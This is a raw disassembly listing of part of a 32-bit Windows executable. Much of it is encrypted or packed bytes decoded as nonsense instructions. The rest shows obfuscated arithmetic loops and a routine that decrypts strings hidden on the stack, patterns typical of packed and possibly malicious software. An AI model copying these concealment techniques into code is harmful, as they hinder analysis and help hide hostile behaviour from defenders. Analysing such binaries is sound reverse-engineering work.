  4119ac:	or     BYTE PTR [edi-0x49],bl
  4119af:	aam    0xc3
  4119b1:	push   edx
  4119b2:	scas   eax,DWORD PTR es:[edi]
  4119b3:	imul   edi,DWORD PTR [ebp+0x5f8153dd],0x77664feb
  4119bd:	cwde   
  4119be:	sbb    eax,0x268fefb8
  4119c3:	test   eax,0x8ef6df96
  4119c8:	mov    ecx,0x33f5c2b7
  4119cd:	mov    ah,0xe7
  4119cf:	xor    dl,ah
  4119d1:	das    
  4119d2:	dec    edx
  4119d3:	pop    ds
  4119d4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4119d5:	mov    cl,0x6e
  4119d7:	and    ebp,esi
  4119d9:	test   DWORD PTR [ecx-0x6a01aec5],ebx
  4119df:	test   cl,ch
  4119e1:	cmp    al,0x8b
  4119e3:	out    dx,al
  4119e4:	pop    es
  4119e5:	adc    eax,0xdb17fa00
  4119ea:	add    eax,0x140783a7
  4119ef:	inc    ebx
  4119f0:	pop    ss
  4119f1:	popf   
  4119f2:	pop    esp
  4119f3:	jl     0x411976
  4119f5:	mov    edi,0xd6aba561
  4119fa:	push   esi
  4119fb:	adc    eax,0x5cebcf30
  411a00:	iret   
  411a01:	dec    esi
  411a02:	mov    eax,ds:0x28373f51
  411a07:	mov    eax,ds:0x52fc8797
  411a0c:	mov    ss,ebp
  411a0e:	sti    
  411a0f:	pop    ebx
  411a10:	in     al,dx
  411a11:	mov    ebp,0xc4624724
  411a16:	data16 cmp BYTE PTR [edx-0x2a59aa37],al
  411a1d:	xchg   ebp,eax
  411a1e:	and    DWORD PTR ds:0xc68f75bb,0x97ebe7f6
  411a28:	or     ebp,DWORD PTR [esi-0x52]
  411a2b:	stc    
  411a2c:	sbb    eax,DWORD PTR [edx+0x45]
  411a2f:	jns    0x4119c1
  411a31:	sub    eax,0x4a6411cd
  411a36:	cmp    DWORD PTR [ecx+0x23],esi
  411a39:	cld    
  411a3a:	push   esi
  411a3b:	ss pushf 
  411a3d:	cmp    DWORD PTR [ebp-0x37],0xcd215f4a
  411a44:	mov    DWORD PTR [edi],esp
  411a46:	int    0x2d
  411a48:	or     BYTE PTR cs:[ebx+0xe],ah
  411a4c:	js     0x4119dd
  411a4e:	mov    bh,0x44
  411a50:	cdq    
  411a51:	mov    ds:0xeb514bde,eax
  411a56:	lds    ebp,FWORD PTR [eax-0x7bb24e00]
  411a5c:	leave  
  411a5d:	jp     0x4119e4
  411a5f:	dec    ecx
  411a60:	pop    es
  411a61:	ins    BYTE PTR es:[edi],dx
  411a62:	sub    BYTE PTR [esi],ah
  411a64:	stos   DWORD PTR es:[edi],eax
  411a65:	fadd   QWORD PTR [esi-0x52]
  411a68:	cmp    BYTE PTR [ecx+0x1],ch
  411a6b:	rcr    BYTE PTR [eax],cl
  411a6d:	into   
  411a6e:	int3   
  411a6f:	dec    ecx
  411a70:	(bad)  
  411a71:	mov    edx,esi
  411a73:	push   esp
  411a74:	nop
  411a75:	pop    esp
  411a76:	rol    DWORD PTR [ecx],0xc5
  411a79:	es (bad) 
  411a7b:	or     edi,eax
  411a7d:	xchg   BYTE PTR [ebp-0x78],dh
  411a80:	les    ebp,FWORD PTR [edx]
  411a82:	sbb    eax,esi
  411a84:	jecxz  0x411a07
  411a86:	in     al,0x22
  411a88:	mov    dh,0x82
  411a8a:	inc    esi
  411a8b:	jne    0x411af1
  411a8d:	(bad)  
  411a8e:	adc    al,0xba
  411a90:	neg    DWORD PTR [esi+0x11]
  411a93:	dec    ebp
  411a94:	sbb    eax,0x72c59d08
  411a99:	add    dl,BYTE PTR [ebp+0x10]
  411a9c:	sar    BYTE PTR [ebp+eiz*2+0x63],0x32
  411aa1:	push   0x6edc7896
  411aa6:	pop    edx
  411aa7:	cmp    DWORD PTR [ebx-0x69],ebp
  411aaa:	out    dx,al
  411aab:	jb     0x411aa9
  411aad:	inc    edx
  411aae:	push   edi
  411aaf:	hlt    
  411ab0:	repnz fdivr QWORD PTR [edi+0x41a27be4]
  411ab7:	retf   0xaa5a
  411aba:	mov    al,ds:0xdd471536
  411abf:	pop    ss
  411ac0:	sar    BYTE PTR ss:[edx+0x2],0xa9
  411ac5:	and    edi,DWORD PTR [ebp-0x4a]
  411ac8:	dec    ecx
  411ac9:	push   ds
  411aca:	out    0x11,eax
  411acc:	jp     0x411a89
  411ace:	(bad)  
  411acf:	fisub  WORD PTR [eax-0x24]
  411ad2:	jae    0x411b41
  411ad4:	jno    0x411acc
  411ad6:	sbb    BYTE PTR [ecx+edi*8+0x65981644],bh
  411add:	lds    ebx,FWORD PTR [edi-0x55]
  411ae0:	inc    edx
  411ae1:	call   0xf3b6d7b0
  411ae6:	or     eax,0x82445bb3
  411aeb:	and    DWORD PTR [edi+0x17],eax
  411aee:	ins    BYTE PTR es:[edi],dx
  411aef:	bound  ecx,QWORD PTR [ebx+0x3d49b15]
  411af5:	imul   esi,DWORD PTR [ebp+ebp*4-0x330cae6],0xffffffe6
  411afd:	jbe    0x411ae0
  411aff:	cmp    eax,0xcf7da9c7
  411b04:	ror    BYTE PTR [ebp-0x22],cl
  411b07:	xor    DWORD PTR [edx-0x5f],esi
  411b0a:	(bad)
  411b0e:	mov    ebp,0x33de91ce
  411b13:	inc    edx
  411b14:	dec    ebp
  411b15:	sar    BYTE PTR [esi-0x2f],1
  411b18:	cs cs clc 
  411b1b:	lock (bad) 
  411b1d:	jge    0x411ae7
  411b1f:	je     0x411b49
  411b21:	out    dx,al
  411b22:	dec    edi
  411b23:	out    dx,eax
  411b24:	jmp    0xa6d8:0x70223173
  411b2b:	fidivr DWORD PTR [ecx+0x24070dd8]
  411b31:	or     edx,esp
  411b33:	loope  0x411b32
  411b35:	popa   
  411b36:	in     eax,0x98
  411b38:	jp     0x411b34
  411b3a:	jns    0x411b15
  411b3c:	pop    edx
  411b3d:	pop    esi
  411b3e:	sub    esi,esi
  411b40:	xchg   edi,eax
  411b41:	inc    eax
  411b42:	scas   al,BYTE PTR es:[edi]
  411b43:	mov    dh,0x65
  411b45:	cmp    eax,0x325984b7
  411b4a:	aad    0x20
  411b4c:	scas   al,BYTE PTR es:[edi]
  411b4d:	aam    0xcd
  411b4f:	scas   al,BYTE PTR es:[edi]
  411b50:	dec    ebx
  411b51:	push   ebp
  411b52:	mov    ds:0x77eb570b,al
  411b57:	xchg   esp,eax
  411b58:	sub    al,BYTE PTR [eax+ebp*8]
  411b5b:	mov    ebx,0x61a687fb
  411b60:	jmp    0x411b15
  411b62:	jle    0x411bd7
  411b64:	mov    bl,0xc8
  411b66:	sub    al,0xac
  411b68:	je     0x411bda
  411b6a:	in     al,dx
  411b6b:	fdivr  DWORD PTR [edi+0x44]
  411b6e:	fdivrp st(0),st
  411b70:	mov    ah,0xfc
  411b72:	dec    ebp
  411b73:	add    DWORD PTR [edx-0x35],0x2
  411b77:	ss push 0xeabe47b
  411b7d:	dec    edi
  411b7e:	(bad)  
  411b7f:	outs   dx,DWORD PTR ds:[esi]
  411b80:	or     esi,DWORD PTR [ebx+edi*1]
  411b83:	data16 rcl BYTE PTR [edi],0xd8
  411b87:	push   0xffffffeb
  411b89:	stos   BYTE PTR es:[edi],al
  411b8a:	and    eax,0xfa132d0e
  411b8f:	xchg   ebp,eax
  411b90:	(bad)  
  411b92:	mov    eax,0x39fcb6b0
  411b97:	push   0xaf792705
  411b9c:	xchg   ebx,eax
  411b9d:	retf   
  411b9e:	or     DWORD PTR [esi],eax
  411ba0:	std    
  411ba1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411ba2:	fisttp DWORD PTR [edx]
  411ba4:	data16 mov dh,0x16
  411ba7:	mov    bh,0xab
  411ba9:	xlat   BYTE PTR ds:[ebx]
  411baa:	(bad)  
  411bab:	and    bh,cl
  411bad:	jmp    0x5e29f2ca
  411bb2:	sbb    al,0xec
  411bb4:	dec    esi
  411bb5:	inc    edi
  411bb6:	push   DWORD PTR [esi+ebp*8]
  411bb9:	mov    al,0xbd
  411bbb:	sub    BYTE PTR [edx+0x77f3a346],ah
  411bc1:	adc    eax,DWORD PTR [edx-0x12]
  411bc4:	jno    0x411be5
  411bc6:	mov    dl,0x3a
  411bc8:	test   BYTE PTR [esi-0x76],dh
  411bcb:	scas   eax,DWORD PTR es:[edi]
  411bcc:	and    eax,ebp
  411bce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411bcf:	mov    esi,0x420f3a0f
  411bd4:	popa   
  411bd5:	pop    ebx
  411bd6:	shl    DWORD PTR [edi+0x11],1
  411bd9:	out    dx,al
  411bda:	or     al,0x7d
  411bdc:	call   0xc307:0x7631e077
  411be3:	fcmovu st,st(2)
  411be5:	cli    
  411be6:	cmp    BYTE PTR [ebx+0x7b553c4a],0x5a
  411bed:	mov    ebx,0xd1125b8c
  411bf2:	push   ds
  411bf3:	fs cdq 
  411bf5:	or     DWORD PTR [esi+0x173e4bf8],ebp
  411bfb:	xor    DWORD PTR [edx],esi
  411bfd:	jg     0x411bf6
  411bff:	jae    0x411c4d
  411c01:	xor    al,0x48
  411c03:	mov    ah,0xa6
  411c05:	mov    esp,DWORD PTR [esi]
  411c07:	add    esp,DWORD PTR [ebp+0x60f5618b]
  411c0d:	add    eax,0x538e1aed
  411c12:	mov    ch,0x9a
  411c14:	sbb    ebx,DWORD PTR [eax]
  411c16:	icebp  
  411c17:	pop    ebp
  411c18:	jle    0x411c20
  411c1a:	push   0xa4560218
  411c1f:	mov    edx,0x11626b55
  411c24:	outs   dx,BYTE PTR ds:[esi]
  411c25:	stc    
  411c26:	mov    ah,0x20
  411c28:	shl    bl,0xd3
  411c2b:	pop    es
  411c2c:	or     DWORD PTR [ebp+0x4],ebx
  411c2f:	div    BYTE PTR [edi]
  411c31:	mov    eax,ds:0xff03b46d
  411c36:	xor    eax,0x86242f1b
  411c3b:	xor    dh,BYTE PTR [edx+0x6a]
  411c3e:	jmp    0x411c5b
  411c40:	(bad)  
  411c41:	mov    ebp,0x3cc0713d
  411c46:	mov    ch,0xf1
  411c48:	mov    edx,DWORD PTR [edi-0x62a8462d]
  411c4e:	shl    DWORD PTR [edx],0x4a
  411c51:	xor    eax,0x103e5540
  411c56:	jnp    0x411c1d
  411c58:	pop    es
  411c59:	loopne 0x411c53
  411c5b:	outs   dx,DWORD PTR ds:[esi]
  411c5c:	arpl   bx,bp
  411c5e:	(bad)  
  411c5f:	push   0x4a
  411c61:	clc    
  411c62:	cmp    BYTE PTR [ecx+0x5c53fac1],0x1a
  411c69:	push   eax
  411c6a:	or     dh,BYTE PTR [edx]
  411c6c:	inc    esi
  411c6d:	mov    WORD PTR [ebx+0x222bc7e5],es
  411c73:	in     eax,0x6e
  411c75:	loop   0x411c6f
  411c77:	inc    esp
  411c78:	mov    ch,BYTE PTR [eax+ecx*2+0x26f6dfa4]
  411c7f:	push   ds
  411c80:	and    bl,ch
  411c82:	push   esi
  411c83:	sti    
  411c84:	and    DWORD PTR [ecx-0x60190b9],ebx
  411c8a:	in     al,0x1b
  411c8c:	(bad)  
  411c8d:	int3   
  411c8e:	ret    
  411c8f:	sahf   
  411c90:	adc    al,0xbb
  411c92:	outs   dx,DWORD PTR ds:[esi]
  411c93:	adc    ebp,DWORD PTR [ebp+0x25]
  411c96:	jmp    0x411cfe
  411c98:	std    
  411c99:	sbb    eax,0xd7a9d030
  411c9e:	arpl   WORD PTR ds:0xc4e2e923,si
  411ca4:	imul   DWORD PTR [ecx]
  411ca6:	bound  ebp,QWORD PTR [ebp+0x6441e8a3]
  411cac:	jb     0x411c5f
  411cae:	bound  ebx,QWORD PTR [ebx+eiz*1-0x37f33595]
  411cb5:	adc    DWORD PTR ds:0x2f7a7399,ecx
  411cbb:	stos   DWORD PTR es:[edi],eax
  411cbc:	arpl   dx,si
  411cbe:	not    bh
  411cc0:	add    BYTE PTR [ebx+0x5f42afa8],al
  411cc6:	test   al,0xd8
  411cc8:	ss pop eax
  411cca:	arpl   WORD PTR [eax-0x5d2087ea],ax
  411cd0:	fwait
  411cd1:	dec    dl
  411cd3:	sub    ecx,esp
  411cd5:	add    al,0xac
  411cd7:	xor    al,0x39
  411cd9:	xchg   ebp,eax
  411cda:	in     al,dx
  411cdb:	aad    0x1a
  411cdd:	sub    ah,BYTE PTR [edx]
  411cdf:	push   eax
  411ce0:	sub    ah,BYTE PTR [edx-0x5aadff25]
  411ce6:	popf   
  411ce7:	push   0x89a0aeb1
  411cec:	dec    ecx
  411ced:	dec    eax
  411cee:	retf   0xb5f5
  411cf1:	sti    
  411cf2:	jae    0x411d22
  411cf4:	cwde   
  411cf5:	jb     0x411d2c
  411cf7:	and    al,0xb1
  411cf9:	jmp    0xead43975
  411cfe:	add    DWORD PTR [ecx-0x79897683],ecx
  411d04:	pop    esi
  411d05:	mov    ecx,0x944a64b0
  411d0a:	jne    0x411cb3
  411d0c:	push   0xc449a90d
  411d11:	ret    0xf47d
  411d14:	rcl    DWORD PTR ds:0xa8ffde04,cl
  411d1a:	mov    DWORD PTR [esi],ebx
  411d1c:	in     eax,0xe5
  411d1e:	data16 jle 0x411ccd
  411d21:	mov    es,WORD PTR [esi+0x5]
  411d24:	cld    
  411d25:	inc    esi
  411d26:	jle    0x411d79
  411d28:	mov    ds:0x7a51e40d,al
  411d2d:	mov    esp,0x79519ee4
  411d32:	pop    esi
  411d33:	mov    BYTE PTR [ebx-0x6f],cl
  411d36:	sbb    edx,DWORD PTR [ebp+0x1e02a36f]
  411d3c:	and    BYTE PTR [eax-0x69],cl
  411d3f:	das    
  411d40:	push   ebp
  411d41:	imul   eax,DWORD PTR [ebx-0x24],0x80f84b5
  411d48:	or     eax,0xb21656d2
  411d4d:	std    
  411d4e:	adc    BYTE PTR [edx+0x28],dh
  411d51:	pop    ss
  411d52:	xor    DWORD PTR [ecx],esi
  411d54:	xchg   esi,eax
  411d55:	add    ebp,ecx
  411d57:	xchg   edi,eax
  411d58:	ror    DWORD PTR [ebp-0x49],0x41
  411d5c:	cld    
  411d5d:	(bad)  
  411d5e:	sbb    ch,BYTE PTR [esi-0x14]
  411d61:	rcr    DWORD PTR [ecx],0x4c
  411d64:	inc    edx
  411d65:	iret   
  411d66:	dec    edi
  411d67:	loop   0x411d29
  411d69:	inc    edi
  411d6a:	and    bl,BYTE PTR [edi-0x4c66bc5a]
  411d70:	mov    esp,0xe8f52e88
  411d75:	cli    
  411d76:	frstor [esi-0x3d]
  411d79:	ds mov ecx,0x2f61e62b
  411d7f:	push   edi
  411d80:	ins    DWORD PTR es:[edi],dx
  411d81:	shr    BYTE PTR [esi],1
  411d83:	push   ebx
  411d84:	xor    DWORD PTR [eax+0x1c],edi
  411d87:	loop   0x411d46
  411d89:	das    
  411d8a:	push   edx
  411d8b:	pop    edx
  411d8c:	jle    0x411d1b
  411d8e:	pop    ss
  411d8f:	aas    
  411d90:	pop    ss
  411d91:	push   edx
  411d92:	mov    ah,0x70
  411d94:	aaa    
  411d95:	cmp    DWORD PTR [eax+eax*1-0x79],ebx
  411d99:	daa    
  411d9a:	arpl   WORD PTR [ebx],di
  411d9c:	mov    ebx,0x33f8af13
  411da1:	cmp    ecx,edx
  411da3:	jb     0x40f9d0
  411da9:	jmp    0x411df3
  411dae:	mov    ecx,DWORD PTR [ebp-0xc]
  411db1:	mov    DWORD PTR [ebp+0x8],ecx
  411db4:	jmp    0x411de6
  411db9:	mov    ecx,DWORD PTR [ebp+0x8]
  411dbc:	mov    edx,DWORD PTR [ebp-0x8]
  411dbf:	xor    ecx,eax
  411dc1:	xor    edx,eax
  411dc3:	sub    ecx,edx
  411dc5:	sub    ecx,esi
  411dc7:	xor    ecx,eax
  411dc9:	mov    DWORD PTR [ebp+0x8],ecx
  411dcc:	mov    ecx,DWORD PTR [ebp+0x8]
  411dcf:	mov    edx,DWORD PTR [ebp+0x8]
  411dd2:	imul   edx,edx,0x5708f2
  411dd8:	xor    ecx,eax
  411dda:	add    ecx,esi
  411ddc:	lea    ecx,[ebp+ecx*4-0x64]
  411de0:	mov    edi,DWORD PTR [ecx]
  411de2:	add    edx,edi
  411de4:	mov    DWORD PTR [ecx],edx
  411de6:	mov    ecx,DWORD PTR [ebp+0x8]
  411de9:	xor    ecx,eax
  411deb:	add    ecx,esi
  411ded:	jne    0x411db9
  411df3:	mov    ecx,DWORD PTR [ebp-0xc]
  411df6:	mov    DWORD PTR [ebp+0x8],ecx
  411df9:	jmp    0x411e2b
  411dfe:	mov    ecx,DWORD PTR [ebp+0x8]
  411e01:	mov    edx,DWORD PTR [ebp-0x8]
  411e04:	xor    ecx,eax
  411e06:	xor    edx,eax
  411e08:	sub    ecx,edx
  411e0a:	sub    ecx,esi
  411e0c:	xor    ecx,eax
  411e0e:	mov    DWORD PTR [ebp+0x8],ecx
  411e11:	mov    ecx,DWORD PTR [ebp+0x8]
  411e14:	mov    edx,DWORD PTR [ebp+0x8]
  411e17:	imul   edx,edx,0x5708f2
  411e1d:	xor    ecx,eax
  411e1f:	add    ecx,esi
  411e21:	lea    ecx,[ebp+ecx*4-0x64]
  411e25:	mov    edi,DWORD PTR [ecx]
  411e27:	add    edx,edi
  411e29:	mov    DWORD PTR [ecx],edx
  411e2b:	mov    ecx,DWORD PTR [ebp+0x8]
  411e2e:	xor    ecx,eax
  411e30:	add    ecx,esi
  411e32:	jne    0x411dfe
  411e38:	mov    ecx,DWORD PTR [ebp-0x8]
  411e3b:	mov    edx,DWORD PTR [ebp-0x20]
  411e3e:	xor    ecx,eax
  411e40:	lea    ecx,[ecx+edx*1+0x3272dd]
  411e47:	mov    DWORD PTR [ebp-0x20],ecx
  411e4a:	inc    DWORD PTR [ebp+0xc]
  411e4d:	mov    ecx,DWORD PTR [ebp-0x1c]
  411e50:	xor    ecx,eax
  411e52:	add    ecx,esi
  411e54:	jne    0x40f7af
  411e5a:	jmp    0x411ee3
  411e5f:	mov    ecx,DWORD PTR [ebp-0xc]
  411e62:	mov    DWORD PTR [ebp+0x8],ecx
  411e65:	jmp    0x411e97
  411e6a:	mov    ecx,DWORD PTR [ebp+0x8]
  411e6d:	mov    edx,DWORD PTR [ebp-0x8]
  411e70:	xor    ecx,eax
  411e72:	xor    edx,eax
  411e74:	sub    ecx,edx
  411e76:	sub    ecx,esi
  411e78:	xor    ecx,eax
  411e7a:	mov    DWORD PTR [ebp+0x8],ecx
  411e7d:	mov    ecx,DWORD PTR [ebp+0x8]
  411e80:	mov    edx,DWORD PTR [ebp+0x8]
  411e83:	imul   edx,edx,0x5708f2
  411e89:	xor    ecx,eax
  411e8b:	add    ecx,esi
  411e8d:	lea    ecx,[ebp+ecx*4-0x64]
  411e91:	mov    edi,DWORD PTR [ecx]
  411e93:	add    edx,edi
  411e95:	mov    DWORD PTR [ecx],edx
  411e97:	mov    ecx,DWORD PTR [ebp+0x8]
  411e9a:	xor    ecx,eax
  411e9c:	add    ecx,esi
  411e9e:	jne    0x411e6a
  411ea4:	jmp    0x411eef
  411ea9:	mov    ecx,DWORD PTR [ebp+0x8]
  411eac:	mov    edx,DWORD PTR [ebp-0x8]
  411eaf:	xor    ecx,eax
  411eb1:	xor    edx,eax
  411eb3:	sub    ecx,edx
  411eb5:	sub    ecx,esi
  411eb7:	xor    ecx,eax
  411eb9:	mov    DWORD PTR [ebp+0x8],ecx
  411ebc:	mov    ecx,DWORD PTR [ebp+0x8]
  411ebf:	mov    edx,DWORD PTR [ebp+0x8]
  411ec2:	xor    ecx,eax
  411ec4:	imul   edx,edx,0x5708f2
  411eca:	add    ecx,esi
  411ecc:	lea    ecx,[ebp+ecx*4-0x64]
  411ed0:	mov    edi,DWORD PTR [ecx]
  411ed2:	add    edx,edi
  411ed4:	mov    DWORD PTR [ecx],edx
  411ed6:	mov    ecx,DWORD PTR [ebp+0x8]
  411ed9:	xor    ecx,eax
  411edb:	add    ecx,esi
  411edd:	jne    0x411ea9
  411ee3:	mov    ecx,DWORD PTR [ebp-0x8]
  411ee6:	xor    ecx,eax
  411ee8:	mov    eax,DWORD PTR [ebp+0x10]
  411eeb:	add    ecx,esi
  411eed:	mov    DWORD PTR [eax],ecx
  411eef:	pop    edi
  411ef0:	pop    esi
  411ef1:	pop    ebx
  411ef2:	leave  
  411ef3:	ret    0xc
	...
  411f02:	add    BYTE PTR [eax],al
  411f04:	pop    esi
  411f05:	mov    eax,0x4dd0
  411f0a:	add    BYTE PTR [eax],al
  411f0c:	xor    bl,BYTE PTR [edi]
  411f0e:	add    DWORD PTR [eax],eax
  411f10:	add    DWORD PTR [eax],eax
  411f12:	add    BYTE PTR [eax],al
  411f14:	add    DWORD PTR [eax],eax
  411f16:	add    BYTE PTR [eax],al
  411f18:	add    DWORD PTR [eax],eax
  411f1a:	add    BYTE PTR [eax],al
  411f1c:	sub    BYTE PTR [edi],bl
  411f1e:	add    DWORD PTR [eax],eax
  411f20:	sub    al,0x1f
  411f22:	add    DWORD PTR [eax],eax
  411f24:	xor    BYTE PTR [edi],bl
  411f26:	add    DWORD PTR [eax],eax
  411f28:	test   eax,0x3e000029
  411f2d:	pop    ds
  411f2e:	add    DWORD PTR [eax],eax
  411f30:	add    BYTE PTR [eax],al
  411f32:	push   ebx
  411f33:	jns    0x411fa2
  411f35:	bound  ebp,QWORD PTR [edi+0x6c]
  411f38:	imul   esp,DWORD PTR [ebx+0x45],0x3f006578
  411f3f:	inc    ebx
  411f40:	ins    BYTE PTR es:[edi],dx
  411f41:	outs   dx,DWORD PTR ds:[esi]
  411f42:	jae    0x411fa9
  411f44:	push   edi
  411f45:	imul   ebp,DWORD PTR [esi+0x64],0x7453776f
  411f4c:	popa   
  411f4d:	je     0x411fb8
  411f4f:	outs   dx,DWORD PTR ds:[esi]
  411f50:	outs   dx,BYTE PTR ds:[esi]
  411f51:	inc    ebx
  411f52:	ins    BYTE PTR es:[edi],dx
  411f53:	outs   dx,DWORD PTR ds:[esi]
  411f54:	jae    0x411fbb
  411f56:	push   edi
  411f57:	imul   eax,DWORD PTR [eax],0x40042a0
  411f5d:	mov    al,ds:0xa0080042
  411f62:	inc    edx
  411f63:	add    BYTE PTR [eax+eiz*4],cl
  411f66:	inc    edx
  411f67:	add    BYTE PTR [eax],dl
  411f69:	mov    al,ds:0xa0140042
  411f6e:	inc    edx
  411f6f:	add    BYTE PTR [eax],bl
  411f71:	mov    al,ds:0xa01c0042
  411f76:	inc    edx
  411f77:	add    BYTE PTR [eax],al
  411f79:	rol    BYTE PTR [edx+0x0],1
  411f7c:	add    al,0xd0
  411f7e:	inc    edx
  411f7f:	add    BYTE PTR [eax],cl
  411f81:	rol    BYTE PTR [edx+0x0],1
  411f84:	or     al,0xd0
  411f86:	inc    edx
  411f87:	add    BYTE PTR [eax],dl
  411f89:	rol    BYTE PTR [edx+0x0],1
  411f8c:	adc    al,0xd0
  411f8e:	inc    edx
  411f8f:	add    BYTE PTR [eax],bl
  411f91:	rol    BYTE PTR [edx+0x0],1
  411f94:	sbb    al,0xd0
  411f96:	inc    edx
	...
  411fa3:	add    BYTE PTR [esi-0x48],bl
  411fa6:	ror    BYTE PTR [ebp+0x0],1
  411fa9:	add    BYTE PTR [eax],al
  411fab:	add    BYTE PTR [edx],al
  411fad:	add    BYTE PTR [eax],al
  411faf:	add    BYTE PTR ds:0x30000000,bh
  411fb5:	and    BYTE PTR [ecx],al
  411fb7:	add    BYTE PTR [eax],dh
  411fb9:	adc    al,0x1
  411fbb:	add    BYTE PTR [eax],al
  411fbd:	nop
  411fbe:	inc    edx
  411fbf:	add    BYTE PTR [eax+edx*4],al
  411fc2:	inc    edx
  411fc3:	add    BYTE PTR [eax],cl
  411fc5:	nop
  411fc6:	inc    edx
  411fc7:	add    BYTE PTR [eax+edx*4],cl
  411fca:	inc    edx
  411fcb:	add    BYTE PTR [eax],dl
  411fcd:	nop
  411fce:	inc    edx
  411fcf:	add    BYTE PTR [eax+edx*4],dl
  411fd2:	inc    edx
  411fd3:	add    BYTE PTR [eax],bl
  411fd5:	nop
  411fd6:	inc    edx
  411fd7:	add    BYTE PTR [eax+edx*4],bl
  411fda:	inc    edx
  411fdb:	add    BYTE PTR [eax],ah
  411fdd:	nop
  411fde:	inc    edx
  411fdf:	add    BYTE PTR [eax+edx*4],ah
  411fe2:	inc    edx
  411fe3:	add    BYTE PTR [eax],ch
  411fe5:	nop
  411fe6:	inc    edx
  411fe7:	add    BYTE PTR [eax],al
  411fe9:	mov    al,0x42
  411feb:	add    BYTE PTR [eax+esi*4],al
  411fee:	inc    edx
  411fef:	add    BYTE PTR [eax],cl
  411ff1:	mov    al,0x42
  411ff3:	add    BYTE PTR [eax+esi*4],cl
  411ff6:	inc    edx
  411ff7:	add    BYTE PTR [eax],dl
  411ff9:	mov    al,0x42
  411ffb:	add    BYTE PTR [eax+esi*4],dl
  411ffe:	inc    edx
  411fff:	add    BYTE PTR [eax],bl
  412001:	mov    al,0x42
  412003:	add    BYTE PTR [eax+esi*4],bl
  412006:	inc    edx
  412007:	add    BYTE PTR [eax],al
  412009:	rol    BYTE PTR [edx+0x0],0x4
  41200d:	rol    BYTE PTR [edx+0x0],0x8
  412011:	rol    BYTE PTR [edx+0x0],0xc
  412015:	rol    BYTE PTR [edx+0x0],0x10
  412019:	rol    BYTE PTR [edx+0x0],0x14
  41201d:	rol    BYTE PTR [edx+0x0],0x18
  412021:	rol    BYTE PTR [edx+0x0],0x1c
  412025:	rol    BYTE PTR [edx+0x0],0x0
  412029:	add    BYTE PTR [eax],al
  41202b:	add    BYTE PTR [eax],al
  41202d:	add    BYTE PTR [eax],al
  41202f:	add    BYTE PTR [edx+0x53],dl
  412032:	inc    esp
  412033:	push   ebx
  412034:	repnz push ebp
  412036:	enter  0xdb55,0x63
  41203a:	sbb    ecx,DWORD PTR [edi-0x7e]
  41203d:	jecxz  0x412094
  41203f:	sbb    esp,eax
  412041:	mov    eax,ds:0x1791a
  412046:	add    BYTE PTR [eax],al
  412048:	inc    ebx
  412049:	cmp    bl,BYTE PTR [ebx+eax*2+0x75]
  41204d:	jb     0x4120c1
  41204f:	outs   dx,BYTE PTR gs:[esi]
  412051:	je     0x412097
  412053:	popa   
  412054:	je     0x4120b7
  412056:	pop    esp
  412057:	dec    ebp
  412058:	outs   dx,DWORD PTR ds:[esi]
  412059:	imul   esp,DWORD PTR fs:[esi+0x79],0x7070415c
  412061:	ins    BYTE PTR es:[edi],dx
  412062:	imul   esp,DWORD PTR [ebx+0x61],0x6e6f6974
  412069:	dec    esi
  41206a:	gs ja  0x41206d
  41206d:	mov    edx,DWORD PTR [ebp-0x14]
  412070:	sub    esp,0xe4
  412076:	push   ebx
  412077:	mov    eax,ebx
  412079:	xchg   ecx,eax
  41207a:	mov    eax,DWORD PTR [ebp+0x8]
  41207d:	cmp    eax,0xf89c85b5
  412082:	jne    0x412416
  412088:	mov    eax,DWORD PTR [ebp+0xc]
  41208b:	cmp    eax,0xf89c85b2
  412090:	jne    0x412416
  412096:	mov    eax,DWORD PTR [ebp+0x24]
  412099:	mov    DWORD PTR [ebp-0x4],eax
  41209c:	mov    BYTE PTR [ebp-0x18],0x3
  4120a0:	mov    BYTE PTR [ebp-0x17],0x1e
  4120a4:	mov    BYTE PTR [ebp-0x16],0x5
  4120a8:	mov    BYTE PTR [ebp-0x15],0x4f
  4120ac:	mov    BYTE PTR [ebp-0x14],0x4c
  4120b0:	mov    BYTE PTR [ebp-0x13],0x7a
  4120b4:	mov    BYTE PTR [ebp-0x20],0xf1
  4120b8:	mov    BYTE PTR [ebp-0x1f],0xf
  4120bc:	mov    BYTE PTR [ebp-0x1e],0x1
  4120c0:	mov    BYTE PTR [ebp-0x1d],0xc
  4120c4:	mov    BYTE PTR [ebp-0x1c],0x4f
  4120c8:	mov    BYTE PTR [ebp-0x1b],0x4c
  4120cc:	mov    BYTE PTR [ebp-0x1a],0x7a
  4120d0:	mov    BYTE PTR [ebp-0x28],0xf
  4120d4:	mov    BYTE PTR [ebp-0x27],0x2
  4120d8:	push   esi
  4120d9:	mov    BYTE PTR [ebp-0x26],0x6
  4120dd:	mov    BYTE PTR [ebp-0x25],0xf3
  4120e1:	push   edi
  4120e2:	mov    BYTE PTR [ebp-0x24],0x1d
  4120e6:	mov    BYTE PTR [ebp-0x23],0xa
  4120ea:	push   0x71
  4120ec:	mov    BYTE PTR [ebp-0x22],0x5
  4120f0:	xor    edi,edi
  4120f2:	mov    BYTE PTR [ebp-0x21],0x7a
  4120f6:	xor    esi,esi
  4120f8:	pop    edx
  4120f9:	mov    eax,0xf5
  4120fe:	lea    ecx,[ebp+esi*1-0x18]
  412102:	movzx  ebx,BYTE PTR [ecx]
  412105:	xor    ebx,edx
  412107:	add    ebx,eax
  412109:	inc    esi
  41210a:	mov    BYTE PTR [ecx],bl
  41210c:	cmp    esi,0x6
  41210f:	jb     0x4120fe
  412111:	xor    esi,esi
  412113:	lea    ecx,[ebp+esi*1-0x20]
  412117:	movzx  ebx,BYTE PTR [ecx]
  41211a:	xor    ebx,edx
  41211c:	add    ebx,eax
  41211e:	inc    esi
  41211f:	mov    BYTE PTR [ecx],bl
  412121:	cmp    esi,0x7
  412124:	jb     0x412113
  412126:	xor    esi,esi
  412128:	lea    ecx,[ebp+esi*1-0x28]
  41212c:	movzx  ebx,BYTE PTR [ecx]
  41212f:	xor    ebx,edx
  412131:	add    ebx,eax
  412133:	push   0x8
  412135:	mov    BYTE PTR [ecx],bl
  412137:	inc    esi
  412138:	pop    ecx
  412139:	cmp    esi,ecx
  41213b:	jb     0x412128
  41213d:	lea    eax,[ebp-0x2c]
  412140:	mov    DWORD PTR [ebp-0x8],eax
  412143:	mov    esi,DWORD PTR [ebp-0x8]
  412146:	mov    eax,0x7113fcef
  41214b:	mov    DWORD PTR [esi],eax
